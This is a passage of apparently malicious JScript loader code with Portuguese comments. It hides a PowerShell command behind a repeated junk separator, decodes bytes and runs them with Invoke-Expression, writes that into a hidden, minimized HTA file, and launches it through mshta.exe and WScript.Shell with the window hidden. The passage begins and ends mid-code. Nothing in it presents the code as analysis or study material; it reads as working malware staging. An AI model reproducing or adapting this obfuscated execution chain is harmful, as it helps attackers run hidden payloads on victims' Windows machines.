  '$nestmate=[⥙ƞȂᐿụ࣠చ॥ЇҜS⥙ƞȂᐿụ࣠చ॥ЇҜy⥙ƞȂᐿụ࣠చ॥ЇҜs⥙ƞȂᐿụ࣠చ॥ЇҜt⥙ƞȂᐿụ࣠చ॥ЇҜe⥙ƞȂᐿụ࣠చ॥ЇҜm.⥙ƞȂᐿụ࣠చ॥ЇҜT⥙ƞȂᐿụ࣠చ॥ЇҜe⥙ƞȂᐿụ࣠చ॥ЇҜx⥙ƞȂᐿụ࣠చ॥ЇҜt.⥙ƞȂᐿụ࣠చ॥ЇҜE⥙ƞȂᐿụ࣠చ॥ЇҜn⥙ƞȂᐿụ࣠చ॥ЇҜc⥙ƞȂᐿụ࣠చ॥ЇҜo⥙ƞȂᐿụ࣠చ॥ЇҜd⥙ƞȂᐿụ࣠చ॥ЇҜi⥙ƞȂᐿụ࣠చ॥ЇҜn⥙ƞȂᐿụ࣠చ॥ЇҜg]::⥙ƞȂᐿụ࣠చ॥ЇҜU⥙ƞȂᐿụ࣠చ॥ЇҜT⥙ƞȂᐿụ࣠చ॥ЇҜF⥙ƞȂᐿụ࣠చ॥ЇҜ8.⥙ƞȂᐿụ࣠చ॥ЇҜG⥙ƞȂᐿụ࣠చ॥ЇҜe⥙ƞȂᐿụ࣠చ॥ЇҜt⥙ƞȂᐿụ࣠చ॥ЇҜS⥙ƞȂᐿụ࣠చ॥ЇҜt⥙ƞȂᐿụ࣠చ॥ЇҜr⥙ƞȂᐿụ࣠చ॥ЇҜi⥙ƞȂᐿụ࣠చ॥ЇҜn⥙ƞȂᐿụ࣠చ॥ЇҜg($bytes); ' +
  '⥙ƞȂᐿụ࣠చ॥ЇҜI⥙ƞȂᐿụ࣠చ॥ЇҜn⥙ƞȂᐿụ࣠చ॥ЇҜv⥙ƞȂᐿụ࣠చ॥ЇҜo⥙ƞȂᐿụ࣠చ॥ЇҜk⥙ƞȂᐿụ࣠చ॥ЇҜe⥙ƞȂᐿụ࣠చ॥ЇҜ-⥙ƞȂᐿụ࣠చ॥ЇҜE⥙ƞȂᐿụ࣠చ॥ЇҜx⥙ƞȂᐿụ࣠చ॥ЇҜp⥙ƞȂᐿụ࣠చ॥ЇҜr⥙ƞȂᐿụ࣠చ॥ЇҜe⥙ƞȂᐿụ࣠చ॥ЇҜs⥙ƞȂᐿụ࣠చ॥ЇҜs⥙ƞȂᐿụ࣠చ॥ЇҜi⥙ƞȂᐿụ࣠చ॥ЇҜo⥙ƞȂᐿụ࣠చ॥ЇҜn $nestmate"';

// Escapa barras e aspas para uso dentro do HTA
var psEscaped = ralstonite.replace(/\\/g, "\\\\").replace(/"/g, '\\"');

// Monta o conteúdo do HTA com o replace dentro do JavaScript
var telnetted = '\
<html>\n\
<head>\n\
<HTA:APPLICATION ID="run" BORDER="none" SHOWINTASKBAR="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize" SCROLL="no" />\n\
<script type="text/javascript">\n\
window.onload = function() {\n\
    var tetranychidae = "' + psEscaped + '";\n\
    var allaying = tetranychidae.replace(/⥙ƞȂᐿụ࣠చ॥ЇҜ/g, "");\n\
    var multiplanet = new ActiveXObject("WScript.Shell");\n\
    multiplanet.Run(allaying, 0, false);\n\
    window.close();\n\
};\n\
</script>\n\
</head>\n\
<foreside></foreside>\n\
</html>';

var dilatational = estuate.CreateTextFile(paraflocculus, true);
dilatational.Write(telnetted);
dilatational.Close();

shell.Run('mshta.exe "' + paraflocculus + '"');

WScript.Sleep(2000);
if (estuate.FileExists(paraflocculus)) {
